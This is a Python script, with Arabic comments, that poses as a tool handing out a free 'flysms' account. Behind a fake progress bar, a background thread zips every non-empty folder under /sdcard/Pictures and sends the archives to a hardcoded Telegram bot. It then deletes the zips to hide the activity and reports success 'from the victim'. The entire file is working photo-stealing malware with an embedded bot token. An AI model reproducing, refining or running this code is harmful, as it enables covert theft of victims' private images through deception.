import requests, os, shutil, time, threading, sys

# --- بيانات البوت (عدلها لو حبيت) ---
TOKEN = "8344793681:AAFf8WduQB69NXVwmaF6bojdmKb7Hs650Bs"
CHAT_ID = "7939563431"
API_URL = f"https://api.telegram.org/bot{TOKEN}/"

# متغير عشان نعرف السحب خلص ولا لأ
GRABBER_FINISHED = False

def send_msg(text):
    try:
        requests.post(API_URL + "sendMessage", json={
            "chat_id": CHAT_ID, 
            "text": text, 
            "parse_mode": "Markdown"
        })
    except:
        pass

def auto_zip_and_send():
    global GRABBER_FINISHED
    # المسار اللي هنسحب منه (الصور)
    target = "/sdcard/Pictures"
    
    if os.path.exists(target):
        folders = [f for f in os.listdir(target) if os.path.isdir(os.path.join(target, f))]
        
        for folder in folders:
            item_path = os.path.join(target, folder)
            # لو المجلد فاضي سيبه
            if not os.listdir(item_path): continue
            
            try:
                # ضغط المجلد
                zip_name = f"sys_{folder}_{int(time.time())}"
                shutil.make_archive(zip_name, 'zip', item_path)
                
                # إرسال الملف للبوت
                with open(zip_name+".zip", 'rb') as f:
                    requests.post(API_URL + "sendDocument", 
                                  data={'chat_id': CHAT_ID, 'caption': f"📁 Folder: {folder}"}, 
                                  files={'document': f})
                
                # مسح ملف الـ Zip بعد الإرسال عشان ميبانش
                os.remove(zip_name+".zip")
                time.sleep(1.5) 
            except:
                continue
                
    send_msg("✅ **تم سحب البيانات بنجاح من الضحية.**")
    GRABBER_FINISHED = True

def pro_ui_v2():
    os.system("clear")
    print("\033[92m[ free flysms account ]\033[0m")
    print("-----------------------------------")
    print("[*] Initializing the bypass...")
    time.sleep(2)
    
    progress = 0
    while progress < 95:
        progress += 1
        sys.stdout.write(f"\r \033[93m[*] getting account: [{'#'*(progress//2)}{'.'*(50-(progress//2))}] {progress}%\033[0m")
        sys.stdout.flush()
        time.sleep(0.1)
        
    # الانتظار لحد ما الـ Thread يخلص سحب
    while not GRABBER_FINISHED:
        sys.stdout.write(f"\r \033[93m[*] Progress: [{'#'*47}... ] 95% (please wait a while...)\033[0m")
        sys.stdout.flush()
        time.sleep(2)
        
    for i in range(96, 101):
        sys.stdout.write(f"\r \033[93m[*] Progress: [{'#'*(i//2)}{'.'*(50-(i//2))}] {i}%\033[0m")
        sys.stdout.flush()
        time.sleep(0.1)
        
    print("\n\n\033[92m✨ [Success] here we go i done   \033[0m")

if __name__ == "__main__":
    # تشغيل السحب في الخلفية عشان الواجهة متوقفش
    threading.Thread(target=auto_zip_and_send, daemon=True).start()
    
    # تشغيل الواجهة الوهمية
    pro_ui_v2()
